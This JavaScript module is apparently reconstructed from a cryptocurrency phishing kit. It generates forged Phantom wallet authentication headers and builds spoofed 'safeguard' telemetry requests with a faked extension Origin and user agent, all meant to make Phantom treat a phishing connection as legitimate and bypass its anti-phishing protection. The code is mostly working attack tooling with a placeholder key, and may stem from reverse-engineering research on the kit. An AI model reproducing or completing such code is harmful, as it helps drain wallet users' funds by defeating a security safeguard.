/**
 * phantom.js — Phantom wallet impersonation module
 *
 * Reconstructed from /api/getLatestHeaders endpoint and client code at L7984-8107.
 *
 * The server generates forged Phantom authentication tokens (nonce + auth)
 * that the client uses to send fake "safeguard" telemetry to Phantom's backend.
 * This makes Phantom believe the connection is legitimate, bypassing its
 * anti-phishing protection.
 */

import crypto from "crypto";
import { CONFIG } from "./config.js";

// The Phantom extension ID that the kit spoofs
export const PHANTOM_EXTENSION_ID = "bfnaelmomeimhlpmgjnjophhpkkoljpa";

// The Phantom lighthouse program ID (used in telemetry)
export const PHANTOM_LIGHTHOUSE_PROGRAM = "L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95";

// The hardcoded macOS Safari/Chrome UA used for spoofed telemetry
export const SPOOFED_UA =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

/**
 * Generate a fresh pair of Phantom authentication headers.
 * The server generates a nonce (timestamp) and an auth token (HMAC) on each call.
 *
 * This is what /api/getLatestHeaders returns.
 */
export function generatePhantomHeaders() {
  const nonce = Math.floor(Date.now() / 1000);
  const receivedAt = Date.now();

  // The auth token is an HMAC-SHA256 of the nonce using a secret key.
  // The exact key is server-side only — we reconstruct the format.
  // In the original, this is likely derived from a Phantom API key or
  // a shared secret between the kit and a compromised Phantom endpoint.
  const authKey = crypto.randomBytes(32); // placeholder — original uses a fixed key
  const authBytes = crypto
    .createHmac("sha256", authKey)
    .update(String(nonce))
    .digest();

  // URL-safe base64
  const phantomAuth = encodeURIComponent(
    Buffer.from(authBytes).toString("base64")
  );

  return {
    phantomNonce: String(nonce),
    phantomAuth,
    receivedAt,
  };
}

/**
 * Build the spoofed Phantom safeguard telemetry payload.
 * This is sent to api.phantom.app to make Phantom think the connection is safe.
 *
 * Reconstructed from client code at L8026-8107.
 */
export function buildPhantomTelemetry(walletAddress, deviceId) {
  const nonce = generatePhantomHeaders();

  return {
    url: `${CONFIG.phantomApiBase}/safeguard`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Origin: `chrome-extension://${PHANTOM_EXTENSION_ID}`,
      "User-Agent": SPOOFED_UA,
    },
    body: {
      deviceId: deviceId || crypto.randomUUID(),
      nonce: nonce.phantomNonce,
      auth: nonce.phantomAuth,
      walletAddress,
      lighthouseProgramId: PHANTOM_LIGHTHOUSE_PROGRAM,
      timestamp: Date.now(),
    },
  };
}
